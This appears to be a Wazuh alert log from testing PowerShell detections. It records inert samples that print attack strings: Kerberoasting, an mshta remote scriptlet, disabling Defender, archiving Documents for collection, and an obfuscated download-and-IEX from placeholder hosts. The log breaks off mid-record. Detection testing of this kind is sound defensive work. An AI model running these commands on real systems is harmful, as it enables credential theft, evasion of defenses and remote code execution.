{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"6f601b90-1f8a-4e9d-a366-8a5c3d9256f6","scriptBlockText":"$sampleId='PST-072'; $indicator='Invoke-Ker' + 'beroast -' + 'OutputF' + 'ormat H' + 'ashcat ' + '| Select-' + 'Objec' + 't Sa' + 'mAccoun' + 'tName,Hash'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721882","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-072'; $indicator='Invoke-Ker' + 'beroast -' + 'OutputF' + 'ormat H' + 'ashcat ' + '| Select-' + 'Objec' + 't Sa' + 'mAccoun' + 'tName,Hash'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 6f601b90-1f8a-4e9d-a366-8a5c3d9256f6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:58.9252085Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:58.9252085Z\",\"eventRecordID\":\"721882\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-072'; $indicator='Invoke-Ker' + 'beroast -' + 'OutputF' + 'ormat H' + 'ashcat ' + '| Select-' + 'Objec' + 't Sa' + 'mAccoun' + 'tName,Hash'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 6f601b90-1f8a-4e9d-a366-8a5c3d9256f6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-072'; $indicator='Invoke-Ker' + 'beroast -' + 'OutputF' + 'ormat H' + 'ashcat ' + '| Select-' + 'Objec' + 't Sa' + 'mAccoun' + 'tName,Hash'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"6f601b90-1f8a-4e9d-a366-8a5c3d9256f6\"}}}","id":"1784280959.437797","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:59.943+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e4020163-a6aa-4a4c-b345-3a9990a94fe4","scriptBlockText":"$sampleId='PST-073'; 'routine maintenance script' | Measure-Object -Character; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721887","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-073'; 'routine maintenance script' | Measure-Object -Character; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e4020163-a6aa-4a4c-b345-3a9990a94fe4\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:59.2438449Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:59.2438449Z\",\"eventRecordID\":\"721887\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-073'; 'routine maintenance script' | Measure-Object -Character; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e4020163-a6aa-4a4c-b345-3a9990a94fe4\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-073'; 'routine maintenance script' | Measure-Object -Character; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e4020163-a6aa-4a4c-b345-3a9990a94fe4\"}}}","id":"1784280959.437797","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:59.956+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"65f79a7f-312b-4095-b3e2-0749677fa807","scriptBlockText":"$sampleId='PST-074'; $indicator='mshta.exe javascript:a=GetObject(''script:https://hta.example.invalid/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721889","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-074'; $indicator='mshta.exe javascript:a=GetObject(''script:https://hta.example.invalid/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 65f79a7f-312b-4095-b3e2-0749677fa807\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:59.5752765Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:59.5752765Z\",\"eventRecordID\":\"721889\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-074'; $indicator='mshta.exe javascript:a=GetObject(''script:https://hta.example.invalid/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 65f79a7f-312b-4095-b3e2-0749677fa807\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-074'; $indicator='mshta.exe javascript:a=GetObject(''script:https://hta.example.invalid/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"65f79a7f-312b-4095-b3e2-0749677fa807\"}}}","id":"1784280959.437797","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:59.987+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e84c0872-01b5-4520-869a-360f47c4f0e3","scriptBlockText":"$sampleId='PST-075'; $indicator='sEt-MpprEFerenCe -ExcLusiOnPatH ''c:\\\\__ThesiS_iNERT__'' -diSAbLErEALTImeMOnITOrinG $trUE'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721893","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-075'; $indicator='sEt-MpprEFerenCe -ExcLusiOnPatH ''c:\\__ThesiS_iNERT__'' -diSAbLErEALTImeMOnITOrinG $trUE'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e84c0872-01b5-4520-869a-360f47c4f0e3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:59.9195467Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:59.9195467Z\",\"eventRecordID\":\"721893\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-075'; $indicator='sEt-MpprEFerenCe -ExcLusiOnPatH ''c:\\\\__ThesiS_iNERT__'' -diSAbLErEALTImeMOnITOrinG $trUE'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e84c0872-01b5-4520-869a-360f47c4f0e3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-075'; $indicator='sEt-MpprEFerenCe -ExcLusiOnPatH ''c:\\\\\\\\__ThesiS_iNERT__'' -diSAbLErEALTImeMOnITOrinG $trUE'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e84c0872-01b5-4520-869a-360f47c4f0e3\"}}}","id":"1784280960.437797","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:00.048+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"0c84a334-cddf-458e-ad53-3b9aaf72fe05","scriptBlockText":"$sampleId='PST-076'; $indicator='Get-ChildItem ''$env:USERPROFILE\\\\Documents'' -Recurse | Compress-Archive -DestinationPath ''$env:TEMP\\\\collect.zip'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721896","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-076'; $indicator='Get-ChildItem ''$env:USERPROFILE\\Documents'' -Recurse | Compress-Archive -DestinationPath ''$env:TEMP\\collect.zip'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 0c84a334-cddf-458e-ad53-3b9aaf72fe05\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:00.2489579Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:00.2489579Z\",\"eventRecordID\":\"721896\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-076'; $indicator='Get-ChildItem ''$env:USERPROFILE\\\\Documents'' -Recurse | Compress-Archive -DestinationPath ''$env:TEMP\\\\collect.zip'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 0c84a334-cddf-458e-ad53-3b9aaf72fe05\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-076'; $indicator='Get-ChildItem ''$env:USERPROFILE\\\\\\\\Documents'' -Recurse | Compress-Archive -DestinationPath ''$env:TEMP\\\\\\\\collect.zip'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"0c84a334-cddf-458e-ad53-3b9aaf72fe05\"}}}","id":"1784280961.440104","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":10,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:01.041+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c40b0bef-6b95-49bc-8437-f8a61f8fdb5f","scriptBlockText":"$sampleId='PST-077'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721909","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-077'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c40b0bef-6b95-49bc-8437-f8a61f8fdb5f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:00.5662500Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:00.5662500Z\",\"eventRecordID\":\"721909\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-077'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c40b0bef-6b95-49bc-8437-f8a61f8fdb5f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-077'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c40b0bef-6b95-49bc-8437-f8a61f8fdb5f\"}}}","id":"1784280961.440104","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:01.198+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"bb650d0c-fb28-41dc-b5ac-a0c402dc61ba","scriptBlockText":"$sampleId='PST-078'; $parts=@('$X=NeW-ObjECT',' -cOMoB`j','eCt MSxML2.SER','VErxmLhTTP;',' $x.Open(''g','et'',''HTTpS://x','Ml.Ex`AmPLe.I','NVALId/T','Ask'',$falSE','); $X.SeN','d(); IEX $x','.RESPonSETe','XT'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721932","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-078'; $parts=@('$X=NeW-ObjECT',' -cOMoB`j','eCt MSxML2.SER','VErxmLhTTP;',' $x.Open(''g','et'',''HTTpS://x','Ml.Ex`AmPLe.I','NVALId/T','Ask'',$falSE','); $X.SeN','d(); IEX $x','.RESPonSETe','XT'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: bb650d0c-fb28-41dc-b5ac-a0c402dc61ba\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:02.3404110Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:02.3404110Z\",\"eventRecordID\":\"721932\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-078'; $parts=@('$X=NeW-ObjECT',' -cOMoB`j','eCt MSxML2.SER','VErxmLhTTP;',' $x.Open(''g','et'',''HTTpS://x','Ml.Ex`AmPLe.I','NVALId/T','Ask'',$falSE','); $X.SeN','d(); IEX $x','.RESPonSETe','XT'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: bb650d0c-fb28-41dc-b5ac-a0c402dc61ba\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-078'; $parts=@('$X=NeW-ObjECT',' -cOMoB`j','eCt MSxML2.SER','VErxmLhTTP;',' $x.Open(''g','et'',''HTTpS://x','Ml.Ex`AmPLe.I','NVALId/T','Ask'',$falSE','); $X.SeN','d(); IEX $x','.RESPonSETe','XT'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"bb650d0c-fb28-41dc-b5ac-a0c402dc61ba\"}}}","id":"1784280963.440104","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":2,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:36:03.188+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"14fbaae1-e757-49fa-9a37-0d65be6c8032","scriptBlockText":"$sampleId='PST-079'; Get-Service | Select-Object -First 8 Name, Status; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721934","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-079'; Get-Service | Select-Object -First 8 Name, Status; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 14fbaae1-e757-49fa-9a37-0d65be6c8032\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:02.6653178Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:02.6653178Z\",\"eventRecordID\":\"721934\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-079'; Get-Service | Select-Object -First 8 Name, Status; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 14fbaae1-e757-49fa-9a37-0d65be6c8032\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-079'; Get-Service | Select-Object -First 8 Name, Status; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"14fbaae1-e757-49fa-9a37-0d65be6c8032\"}}}","id":"1784280963.442662","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:03.191+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b59cc80d-e3f1-4d2d-ba7c-c1fe6affc7e2","scriptBlockText":"$sampleId='PST-080'; $indicator='powe`rshell.exe -NoProfile -Wi`ndowStyle Hi`dden -EncodedCommand Vw`ByAGk`AdABlAC0ATwB1AH`QAcAB1AHQ`AIAAnAF`QASABFAFMASQBTAC0ASQBOAEUAUgB`UAC`cA'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721940","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-080'; $indicator='powe`rshell.exe -NoProfile -Wi`ndowStyle Hi`dden -EncodedCommand Vw`ByAGk`AdABlAC0ATwB1AH`QAcAB1AHQ`AIAAnAF`QASABFAFMASQBTAC0ASQBOAEUAUgB`UAC`cA'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b59cc80d-e3f1-4d2d-ba7c-c1fe6affc7e2\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:03.0000017Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:03.0000017Z\",\"eventRecordID\":\"721940\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-080'; $indicator='powe`rshell.exe -NoProfile -Wi`ndowStyle Hi`dden -EncodedCommand Vw`ByAGk`AdABlAC0ATwB1AH`QAcAB1AHQ`AIAAnAF`QASABFAFMASQBTAC0ASQBOAEUAUgB`UAC`cA'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b59cc80d-e3f1-4d2d-ba7c-c1fe6affc7e2\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-080'; $indicator='powe`rshell.exe -NoProfile -Wi`ndowStyle Hi`dden -EncodedCommand Vw`ByAGk`AdABlAC0ATwB1AH`QAcAB1AHQ`AIAAnAF`QASABFAFMASQBTAC0ASQBOAEUAUgB`UAC`cA'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b59cc80d-e3f1-4d2d-ba7c-c1fe6affc7e2\"}}}","id":"1784280963.442662","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:03.203+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"7c97e40a-7568-4a63-a393-bad24d189416","scriptBlockText":"$sampleId='PST-081'; $indicator='gET-chiLditEm ''$eNV:UseRpROfILe\\\\documEnTS'' -REcURSE | ComPResS-arChIvE -DeSTInaTionpAtH ''$ENv:TemP\\\\ColLecT.ziP'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721942","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-081'; $indicator='gET-chiLditEm ''$eNV:UseRpROfILe\\documEnTS'' -REcURSE | ComPResS-arChIvE -DeSTInaTionpAtH ''$ENv:TemP\\ColLecT.ziP'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 7c97e40a-7568-4a63-a393-bad24d189416\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:03.3166159Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:03.3166159Z\",\"eventRecordID\":\"721942\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-081'; $indicator='gET-chiLditEm ''$eNV:UseRpROfILe\\\\documEnTS'' -REcURSE | ComPResS-arChIvE -DeSTInaTionpAtH ''$ENv:TemP\\\\ColLecT.ziP'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 7c97e40a-7568-4a63-a393-bad24d189416\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-081'; $indicator='gET-chiLditEm ''$eNV:UseRpROfILe\\\\\\\\documEnTS'' -REcURSE | ComPResS-arChIvE -DeSTInaTionpAtH ''$ENv:TemP\\\\\\\\ColLecT.ziP'''; Write-Output 